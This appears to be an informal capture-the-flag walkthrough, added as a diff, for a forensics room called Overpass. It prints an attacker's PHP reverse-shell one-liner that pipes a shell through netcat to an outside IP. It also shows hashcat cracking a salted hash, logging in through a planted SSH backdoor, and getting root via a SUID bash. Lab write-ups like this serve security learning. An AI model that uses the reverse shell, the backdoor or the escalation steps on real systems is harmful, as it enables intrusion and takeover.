@@ -1,0 +1,60 @@
+Step 1:
+Perform full forensic of overpass pcapng file
+
+Shell used by hacker :
+<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?>
+find salt in file main.go
+after downloading the ssh backdoor
+here's the link
+https://github.com/NinjaJc01/ssh-backdoor
+store text file in format of (hash:salt) then only crack it !!
+
+Now crack the password using hashcat 
+┌──(kali㉿kali)-[~/Desktop/thm]
+└─$ hashcat -m 1710 hash.txt /usr/share/wordlists/rockyou.txt --force
+hashcat (v6.1.1) starting...
+
+You have enabled --force to bypass dangerous warnings and errors!
+This can hide serious problems and should only be done when debugging.
+Do not report hashcat issues encountered when using --force.
+OpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+=============================================================================================================================
+* Device #1: pthread-Intel(R) Core(TM) i7-10510U CPU @ 1.80GHz, 1424/1488 MB (512 MB allocatable), 2MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+Minimim salt length supported by kernel: 0
+Maximum salt length supported by kernel: 256
+
+INFO: All hashes found in potfile! Use --show to display them.
+
+Started: Sun Jul 25 19:09:07 2021
+Stopped: Sun Jul 25 19:09:07 2021
+                                                                                                                                                                                            
+┌──(kali㉿kali)-[~/Desktop/thm]
+└─$ hashcat -m 1710 hash.txt /usr/share/wordlists/rockyou.txt --force --show
+6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed:1c362db832f3f864c8c2fe05f2002a05:november16
+
+
+Message of Hacker : Hacked by coctusclan
+
+in overpass pcap ng at sno 29 follow tcp stream at end you will find backdoor running at 0.0.0.0:2222 simply get into ssh 
+Enter above cracked password
+read user.txt
+run suid_bash in james directory and read root.txt
+┌──(kali㉿kali)-[~]
+└─$ ssh -p 2222 james@10.10.23.102
+james@10.10.23.102's password: 
+To run a command as administrator (user "root"), use "sudo <command>".
+See "man sudo_root" for details.
+
+james@overpass-production:/home/james/ssh-backdoor$
+
+james@overpass-production:/home/james/$./.suid_bash -p 
+.suid_bash-4.4# ls
+root.txt
+.suid_bash-4.4# 
+ 
+ANDDDDDDDDDDD..............
+
+!!!!!!!!!!!!!!!!!!!!HAALELUIAH!!!!!!!!!!!!!!!!
